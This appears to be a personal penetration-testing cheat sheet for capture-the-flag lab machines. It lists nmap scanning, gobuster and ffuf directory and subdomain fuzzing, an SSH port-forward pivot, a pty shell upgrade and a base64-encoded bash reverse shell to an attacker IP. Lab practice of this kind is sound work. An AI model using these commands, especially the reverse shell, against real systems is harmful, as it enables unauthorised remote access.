# prep
## Useful commands
sudo nmap -sC -sV -vv -p- 10.10.11.221

## dirs gobuster 
dir -w  /usr/share/wordlists/dirbuster/directory-medium-2.3.txt -u domain.name

## subdomains:
ffuf -c -ac -w ~/Downloads/subdomains-10000.txt -H 'Host: FUZZ.domain.name' -u http://domainname 

## ssh pivot
ssh -L 1234:localhost:8080 rosa@10.10.11.38 
connect using localhost:1234

python3 -c 'import pty; pty.spawn("/bin/sh")'

base64
echo -n 'bash -i >& /dev/tcp/10.10.16.12/4242 0>&1' | base64 
